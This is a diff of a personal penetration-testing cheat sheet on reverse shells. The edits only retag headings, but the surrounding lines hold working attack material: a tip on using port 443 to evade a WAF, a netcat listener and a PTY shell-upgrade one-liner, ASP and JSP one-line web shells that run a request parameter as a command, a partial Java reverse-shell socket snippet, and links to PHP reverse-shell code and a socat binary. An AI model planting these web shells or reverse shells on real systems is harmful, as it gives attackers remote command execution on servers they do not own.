@@ -1,5 +1,5 @@
 ! Use 443 port to evade WAF.
-
+#shell
 ##### Upgrade shell to fully interactive:
 ```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
@@ -18,7 +18,7 @@ rlwrap nc -lvnp
 https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/
 
 #### PHP
-[[php]]
+#php
 https://raw.githubusercontent.com/Wh1ter0sEo4/reverse_shell_php/refs/heads/main/reverse_shell.php
 
 ```php
@@ -26,17 +26,17 @@ https://raw.githubusercontent.com/Wh1ter0sEo4/reverse_shell_php/refs/heads/main/
 ```
 
 ##### Java:
-[[java]]
+#java
 https://alionder.net/jenkins-script-console-code-exec-reverse-shell-java-deserialization/
 
 ##### ASP:
-[[asp]]
+#asp
 ```asp
 <% eval request("cmd") %>
 ```
 
 ##### JSP:
-[[jsp]] [[java]]
+[[jsp]] #java
 ```jsp
 <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
 ```
@@ -51,7 +51,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 ```
 
 ##### Socat port forwarding:
-[[socat]] [[bash]] [[shell]]
+[[socat]] #bash #shell
 Download:
 https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat
 
